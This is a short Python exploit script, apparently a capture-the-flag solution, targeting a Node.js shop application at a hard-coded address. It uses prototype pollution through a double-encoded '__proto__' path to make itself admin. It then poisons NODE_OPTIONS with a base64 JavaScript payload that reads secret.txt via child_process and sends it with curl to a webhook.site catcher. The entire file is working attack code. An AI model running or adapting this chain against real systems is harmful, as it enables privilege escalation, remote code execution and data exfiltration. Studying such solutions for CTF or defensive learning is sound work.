import requests
import base64

# Update these configurations to match your setup
host = 'http://103.185.44.248'
port = 5001  # Change to your selected port
catcher_url = 'https://webhook.site/36776546-3bfc-4a12-8582-0dbceeacb9ab'  # Change to your request catcher URL

base_url = f'{host}:{port}'

# step 1: pollute role to be admin
res = requests.post(f'{base_url}/shops/buy/%255f%255fproto%255f%255f', json={"role": "admin"})
print(res.text)

# step 2: get first part of flag
res = requests.post(f'{base_url}/shops/buy/5')
print(res.text)

# step 3: get second part of flag
js_payload = f"import {{ execSync }} from 'child_process'; const flag = execSync('cat secret.txt').toString().trim(); execSync(`curl {catcher_url}?flag=${{encodeURIComponent(flag)}}`);"
encoded = base64.b64encode(js_payload.encode()).decode()

res = requests.post(f'{base_url}/shops/buy/%255f%255fproto%255f%255f', json={"NODE_OPTIONS": f"--import=data:text/javascript;base64,{encoded}"})
print(res.text)

# go check your request catcher for the second part of flag!